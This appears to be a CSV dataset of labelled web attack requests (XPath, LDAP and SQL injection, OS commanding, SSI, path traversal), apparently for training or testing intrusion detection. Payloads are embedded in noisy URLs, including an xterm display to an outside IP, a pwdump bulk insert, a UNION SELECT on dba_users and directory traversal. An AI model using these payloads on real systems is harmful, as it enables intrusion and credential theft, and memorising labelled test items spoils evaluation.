,id,class,vector
0,0,XPathInjection,/lqlehaRus4/wREtSesTncl9tln/nI/u8ti8/L@AHchild/r0nJdq.9T/ne/g4c6cHsWen/stdinTc1copydi7Ntvg/kLk52NL3lKbqj/1huhzroseeaTuaa/oKuv_P2PxUjA.cfm?sMcu3tdDhes=reesEh&aOfJ1N=140&en3ifiGgite=37881+++or+++1%3C+++1arn%2FdtXu%2Fs%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D4%5D+++or++++32%3D%27%5D+%7C+%2F*+%7C+%2Ffoo%5Bbar%3D%27&mw0i2boofe=dmeo0rdtT&h4noFrlrue0gee=241294911&ZMsT=8123606893&be4htes=soumPsp
1,1,OsCommanding,/dcNF_symcnzynma/en46/tQrU2n/o10jR86coK.sDGjMe3/twctuzHOmUxDc83tZ/tnecipd8ui07mi/zd7sivKoaoupeCwcwoT/utqeeanwt6/rW6AxaZ_QzojMfF/Gb.jpeg?b7jere8IrzeN=00&eaRyeOsrl=hhtaccesi%3Ai+3srS3tr&asiens1xsbu3G=w%40ibh%3Dswt&xrasitjusr=Tm+o&wigni0ah=%5Crxterm+-display++213.152.153.76%3A0.0
2,2,LdapInjection,/ea@l/tOnimc/yf4s-cmdh/e7Ag2mql9.jpeg?uOh=sDSQwW38&ot=rop&alUeeg5t=ztexlw6tiweD&0erZfco6tro0=capassthruret%26ttaibnchild&iw=6006189&s1=hece%29%28%26%28objectClass++++%3Dgte*%29&bakOZ7Px=6eaaoe&extitl=08222649&imghaEnu16=76275&dmdItmmnefhe=tJEuj&zvQs=8239422&53e7agsOhnie=826582&oilsdr9t=dhY.
3,3,LdapInjection,nototpsfd=deleteCn&a2trserdDSnec=ejS9sti_&thegrouwo=jhklt&hsedeagertaroo=pf&2foaAhid=5744526&Mth6hoc=10088167&h0=41508833&ejxNm63d=oscupE&siSnmsmoMer=800025&iSncUpfj1BEI=darhcsiaa2r2scs&riereratet8go=661
4,4,XPathInjection,nlmbmpea=eSddetgeciimsibn&aiftr=39&mst=1178800491&hsf1mOEohS=kl6ounb3bs1k2e&uebtci=us0rqennDrefi
5,5,LdapInjection,/aKdNFrwg3/nBdttln/rJbsyUwtV7gL05HUIU/IrE/libeCAs/wUa5astylep/j._MhnXoQC.ZWm.pl?ooeh=MA%7Eedbe9e+psq%3C&lferi8eGetlg=ae&yg@jecatTgYwhere=84166788&ntipsrog6t81n=hBo247avdN%27s%25baiG&tffsoigi6erlakq=lcu6aa&kgesmaP=tEWzPtO&uaivyTdht=87246878&nreil7tyeesJ=rsEig&1tch=dt2i2heEeiono&cckc6nds8=oOhuei+asct&XdeXniT=o&6WWZ=u%25rqeeimginpute&eowtpmrxCzzL1gr=iAgeHGlmO5%40&y_ftinsert2P=183759507&sAdpeoyo=1908595
6,6,LdapInjection,/qsosehtoaauXrmw2e/Usg.htm?1TphdpiestvReh=%29+++%28++++%7C++++%28displayName%3Dhad*%29++%28name%3D+++had*++%29%28++mail%3Dhad*%29&ytirsdblxmsrXt=51&5hefcT=svoocf4nsaa4EBmh2&aIreethaneLuy=8&enrolctuytL=0i&tihsaOtias8tt=e&hftkmdeitec=%27+havingcrsynod7stdinei7htred&9oc5lcokhlyNC=nN&etstdsn19SzAcde=nts+5&n4num4o8grn=3609186
7,7,LdapInjection,F@b8inputoptRallbF=rse&gaeonrnshyss2=zs&lLPqOuutSw3=eAtEineWn&A7@6betweenEHYQyKx=344051698&uelelmSgy=658&ehchmshiis=ipee8bgsoundsdaaooe&dReerTref1cgt7t=8266620140&ctasZwi=7&shxUAr=kQYmvG3jHS&jiitStsrg=54709&hetc2tlogqPadminq4access_logz=y&98fperlz-s4nalle=leqneq5&otabnzbiT=587299&aoswipAxteotutc=acTtd7da
8,8,XPathInjection,/eiy.asp?XuRPe=Rtmsr&ph5dd=u0h1otperlSe&sex2tp=input0d02&ve6tha=R+ea%29&tkatx0sddw=nel%7EhtoN
9,9,SSI,/AzYnph-J2echo4Rn/esIi83.tsvoj4J/oqtiEzhrns7vye/emiWNr4QLJSv/tS2BSVgf_b8CcE/o_NrsrkiXSIV/tpoehIinPxthni7z/17iEMstdinx38selectFIsock_stream/easHkT3.bin?o1Hh4tOccuiar6e=hoxKJVV&ridristcia=mwotwp5le93n8&awifu=746&tk=nr&nhtn3tiEbc=e++yn1N&tvteinto=0&uitUd1laliuq1=behbiimewr&Eryrhtoa=gdn&oewat9n=ufifaIitsrobb26hh
10,10,PathTransversal,aonost6T4kta=9220&ttbienua0uo=a%+bodyh-a]h&sncscb4tqHeeu=9764&eo=jhTciy&Bpds=878257703&Ydsii1igp=bina&hohnatnx=C~ss&anadah3rr=c4fn59esyotn5heew&uYodPoBaaae=/../../../../../../../Inetpub/iissamples/ng/erlaon/tearanor/tiet.php&hrbbe26=7&0iMIOinputY=381083050&BzhCb=~ds&XtLfhmdsb=tre8epSrshd&9zneSneosoa=325&tEbsa=b
11,11,SqlInjection,/cdss9uiNbhir9putoDu/cBjtxYssdiNsg3Yetat/eYYEzPiVc/q_.iNv.php3?eogp0Lfl4fl=bulk++insert++++od+++from+++++%27pwdump.exe%27++++++with++%28codepage%3D%27RAW%27++%29&esonRewtqnidqi=hEPFQ
12,12,SSI,/dEN/CCJsQl5gM.Q/seeCrdxatlz/6LQA/zwrRLDmochavS@T.R/qa6nlndeai1yer5Eso/6v/CDMwEXAAb5Q/bodyEr4nJKmE/1SuK3VB5f_m/aVqaO@Lo/vlnEd5krNg.mdb?NwBOxWtelnet=2ahtpass7n+Ipsthfhinon&qlTmarxg=14&nei=ekeveqeei0ssi9r&zmjb=oJG-B7Mj&aquOFzQaccept7t=b%3Ao%24tg&oeelpaaR=99228&4aCG5b7=tXrfuOs8W990
13,13,SqlInjection,/s9oKWZBqX2K8E8T30nD/ge/9e3masin/o0tf0oddvo8i/ileegoaahnnziepea3/stMNeW3V919/lP9pPU7nZRBGN51Iib/dssimarxex/A9lcel2groKrslhao/s5Rlh8as5no2lntioely/fwjhqfRke.png?hx8passthruopaEV3kZ=vSule3n3meta4plux&hSsGhftrvyecWie=tha7loutgtmei9&p1he2heieeeXe=r4elo0rPanra8+ntft&chnrAuhrsm=ahlicln8l&n8OeOnNelTt8ss=ta&ste0ttsemtodlx=rsl%27++++UNION+++%2F**%2F+++SELECT+tyuheaq3+++++FROM++dba_users++WHERE++euaUtc+++like+++%27%2525&xp_Q5YsHnocatko=lwtlobalosqs2su&n3iJmngBjWP=es-b4&i3mciaajdtsyCA=miNdidocemfeLs&VNwBc=a&5eI1o=7tynhxsi28Ie0pr&boay=i
14,14,OsCommanding,/cgi-bin/../../../../../../../WINNT/system32/ping.exe
15,15,OsCommanding,..%5c../..%5c../..%5c/..�
16,16,PathTransversal,aToe=e64klJpjNL&neepyis2enr=Waccess_logphpet]le-zsBlo&uiCsslboee=elasttade&ounmdwyomtnab=e8aon&mehi9ea=yteton&dnttsn0re=7rvJ&qdooh2ssdk=I+tydnc&n6eudtaarrtnzta=riHvjUnNRcDn&4v=nhle+n n
17,17,LdapInjection,nieeso4erq=a& enesvNwaslpieh
